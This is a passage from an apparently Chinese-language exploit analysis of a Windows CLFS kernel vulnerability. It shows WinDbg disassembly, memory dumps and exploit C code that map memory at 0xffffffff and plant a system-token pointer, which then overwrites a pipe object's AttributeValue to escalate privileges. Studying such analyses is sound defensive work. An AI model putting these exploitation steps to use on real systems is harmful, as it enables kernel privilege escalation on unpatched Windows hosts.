</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cb0 <span style=color:#ae81ff>488</span>b05c1240000  mov     rax,qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>CLFS_LSN_INVALID</span> (fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>4178</span>)]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cb7 <span style=color:#ae81ff>4885</span>c9          test    rcx,rcx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cba <span style=color:#ae81ff>7436</span>            je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf2)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cbc <span style=color:#ae81ff>488</span>b09          mov     rcx,qword ptr [rcx]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cbf <span style=color:#ae81ff>483</span>b0d82210000  cmp     rcx,qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>CLFS_LSN_NULL</span> (fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f3e48</span>)]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cc6 <span style=color:#ae81ff>742</span>a            je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf2)
</span></span></code></pre></div><p>内核将依次调用<code>ClfsEarlierLsn</code>和<code>SeSetAccessStateGenericMapping</code></p><p>在<code>ClfsEarlierLsn</code>中edx被设为0xFFFFFFFF</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn:
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cb0 <span style=color:#ae81ff>488</span>b05c1240000 mov     rax, qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>CLFS_LSN_INVALID</span> (fffff800112f4178)]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cb7 <span style=color:#ae81ff>4885</span>c9         test    rcx, rcx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cba <span style=color:#ae81ff>7436</span>           je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff800112f1cf2)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cbc <span style=color:#ae81ff>488</span>b09         mov     rcx, qword ptr [rcx]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cbf <span style=color:#ae81ff>483</span>b0d82210000 cmp     rcx, qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>CLFS_LSN_NULL</span> (fffff800112f3e48)]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cc6 <span style=color:#ae81ff>742</span>a           je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff800112f1cf2)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cc8 <span style=color:#ae81ff>483</span>bc8         cmp     rcx, rax
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>ccb <span style=color:#ae81ff>7425</span>           je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff800112f1cf2)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>ccd <span style=color:#ae81ff>83</span>caff         or      edx, <span style=color:#ae81ff>0FF</span>FFFFFFh
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cd0 <span style=color:#ae81ff>48894</span>c2408     mov     qword ptr [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>], rcx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cd5 <span style=color:#ae81ff>03</span>ca           add     ecx, edx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cd7 <span style=color:#ae81ff>894</span>c2408       mov     dword ptr [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>], ecx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cdb <span style=color:#ae81ff>3</span>bca           cmp     ecx, edx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cdd <span style=color:#ae81ff>750</span>e           jne     CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x3d</span> (fffff800112f1ced)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cdf <span style=color:#ae81ff>8</span>b4c240c       mov     ecx, dword ptr [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>0</span>Ch]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>ce3 <span style=color:#ae81ff>85</span>c9           test    ecx, ecx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>ce5 <span style=color:#ae81ff>740</span>b           je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff800112f1cf2)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>ce7 <span style=color:#ae81ff>03</span>ca           add     ecx, edx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>ce9 <span style=color:#ae81ff>894</span>c240c       mov     dword ptr [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>0</span>Ch], ecx
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>ced <span style=color:#ae81ff>488</span>b442408     mov     rax, qword ptr [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf2 c3             ret
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> redx
</span></span><span style=display:flex><span>edx<span style=color:#f92672>=</span>ffffffff
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> u
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf2 c3              ret
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf3 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf4 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf5 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf6 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf7 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf8 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cf9 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span></code></pre></div><p>在<code>SeSetAccessStateGenericMapping</code>函数中，将rdx存储的指针复制到rcx+48存储的指针指向的内存中，前面调用<code>ClfsEarlierLsn</code>之后，rdx指向<code>0xFFFFFFFF</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>nt<span style=color:#f92672>!</span>SeSetAccessStateGenericMapping:
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da0 <span style=color:#ae81ff>488</span>b4148           mov     rax, qword ptr [rcx<span style=color:#f92672>+</span><span style=color:#ae81ff>48</span>h]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da4 <span style=color:#ae81ff>0f</span><span style=color:#ae81ff>1002</span>             movups  xmm0, xmmword ptr [rdx]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da7 f30f7f4008         movdqu  xmmword ptr [rax<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>], xmm0
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>dac c3                 ret
</span></span></code></pre></div><p>在内存<code>0xFFFFFFFF</code>已经存储了一个指针，该指针指向了system token</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dq rdx
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span>ffffffff  ffffa48f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4149e000</span> <span style=color:#ae81ff>41414141</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4141005</span>a
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000000f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000001f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000002f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000003f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000004f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000005f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000006f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>v14 <span style=color:#f92672>=</span> system_EPROCESS <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xfff</span>;
</span></span><span style=display:flex><span>		v15 <span style=color:#f92672>=</span> system_EPROCESS <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xfffffffffffff000</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		dest2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;
</span></span><span style=display:flex><span>		dest3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100000007</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		value2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x414141414141005A</span>;
</span></span><span style=display:flex><span>		value3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>		value3 <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>value2;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// 在0xffffffff地址分配0x100000大小的内存
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>VirtualAlloc</span>((LPVOID)dest2, <span style=color:#ae81ff>0x100000</span>, <span style=color:#ae81ff>0x3000</span>, <span style=color:#ae81ff>4</span>))
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>memset</span>((LPVOID)dest3, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0xff8</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>			<span style=color:#75715e>// 写入system_EPROCESS &amp; 0xfffffffffffff000;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			<span style=color:#f92672>*</span>(UINT64<span style=color:#f92672>*</span>)dest2 <span style=color:#f92672>=</span> v15;
</span></span></code></pre></div><p>而rcx+48存储了pipe的<code>AttributeValueSize</code>的地址</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rcx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x48</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>005093e8</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>005093f</span><span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9408</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9418</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9428</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9438</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9448</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9458</span>  <span style=color:#ae81ff>18</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span></code></pre></div><p>继续执行，将会把0xFFFFFFFF存储的指针写入到rax+8的地址上，内核中pipe对象的<code>AttributeValue</code> 值已经被覆盖为system token地址</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>nt<span style=color:#f92672>!</span>SeSetAccessStateGenericMapping<span style=color:#f92672>+</span><span style=color:#ae81ff>0xc</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>dac c3              ret
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rax<span style=color:#f92672>-</span><span style=color:#ae81ff>0x18</span>
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c000  b0 <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>0</span>e <span style=color:#ae81ff>27</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span>b0 <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>0</span>e <span style=color:#ae81ff>27</span> <span style=color:#ae81ff>0</span>b bc ff ff  <span style=color:#ae81ff>.2</span>.<span style=color:#960050;background-color:#1e0010>&#39;</span>....<span style=color:#ae81ff>.2</span>.<span style=color:#960050;background-color:#1e0010>&#39;</span>....
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c010  <span style=color:#ae81ff>28</span> c0 f9 <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>0</span>b bc ff ff<span style=color:#f92672>-</span>d6 <span style=color:#ae81ff>0f</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  (..<span style=color:#960050;background-color:#1e0010>$</span>............
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c020  <span style=color:#f92672>**</span><span style=color:#ae81ff>00</span> e0 <span style=color:#ae81ff>49</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>8f</span> a4 ff<span style=color:#f92672>**</span> ff<span style=color:#f92672>-</span><span style=color:#ae81ff>5</span>a <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  ..IA....Z.AAAAAA
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c030  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c040  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c050  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
